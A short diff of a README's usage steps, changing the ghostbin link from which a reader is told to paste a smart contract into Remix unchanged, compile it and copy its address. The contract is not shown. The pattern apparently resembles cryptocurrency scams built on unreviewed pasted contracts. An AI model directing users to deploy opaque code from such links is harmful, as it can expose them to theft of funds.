@@ -24,7 +24,7 @@ How To Use:
 
 4- Click on "contracts" folder and then "Create New File". Rename it as you like " anyname.sol "
 
-5- Paste SmartContract in Remix: https://ghostbin.com/K3FwK/raw (Copy and Paste as it is)
+5- Paste SmartContract in Remix: https://ghostbin.com/wDTk4 (Copy and Paste as it is)
 
 6- Compile it and copy contract address
 
